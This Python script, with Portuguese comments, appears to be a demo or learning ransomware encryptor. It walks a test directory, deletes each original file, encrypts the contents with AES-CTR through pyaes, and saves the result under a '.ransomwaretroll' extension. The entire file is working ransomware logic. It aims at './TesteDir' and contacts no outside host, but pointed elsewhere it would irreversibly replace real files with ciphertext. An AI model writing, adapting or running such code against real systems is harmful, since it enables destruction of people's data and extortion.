import os
import pyaes
from key import get_key
from listFiles import list_all_files

DIRECTORY = "./TesteDir"

def encrypterFiles(files):
    key = get_key()
    if key is not None and files:

        for file in files:
            try:
                with open(file, "rb") as file_open:
                    file_data = file_open.read()
                
                os.remove(file)  # Remove o arquivo original

                aes = pyaes.AESModeOfOperationCTR(key)
                crypto_data = aes.encrypt(file_data)

                parts = os.path.split(file)  # Extrai o caminho e o nome do arquivo
                file_name = parts[-1]  # Pegando apenas o nome do arquivo

                new_file = file_name + ".ransomwaretroll"
                new_file_path = os.path.join(parts[0], new_file)  # Salva no mesmo diretório

                with open(new_file_path, 'wb') as new_file_open:
                    new_file_open.write(crypto_data)
            
            except FileNotFoundError:
                print(f"Arquivo '{file}' não encontrado. Ignorando.")
    return

# Exemplo de uso
list = list_all_files(DIRECTORY)
encrypterFiles(list)